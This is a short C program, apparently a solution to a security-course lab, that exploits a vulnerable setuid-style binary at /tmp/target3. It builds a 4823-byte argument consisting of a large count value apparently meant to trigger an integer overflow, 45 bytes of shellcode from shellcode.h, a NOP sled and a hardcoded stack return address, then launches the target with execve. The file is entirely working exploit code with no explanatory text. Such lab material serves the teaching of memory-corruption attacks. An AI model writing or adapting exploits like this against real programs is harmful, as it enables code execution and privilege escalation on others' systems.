#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  char payload[4823];

  payload[0] = '2';
  payload[1] = '1';
  payload[2] = '4';
  payload[3] = '7';
  payload[4] = '4';
  payload[5] = '8';
  payload[6] = '3';
  payload[7] = '8';
  payload[8] = '8';
  payload[9] = '9';
  payload[10] = ',';
  
  for (int i = 0; i < 45; i++)
{
  payload[i+11] = shellcode[i];
}

for (int i = 0; i < 4763; i++)
{
  payload[i+56] = '\x90';
}

  payload[4819] = '\xa8';
  payload[4820] = '\xd8';
  payload[4821] = '\xff';
  payload[4822] = '\xbf';

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
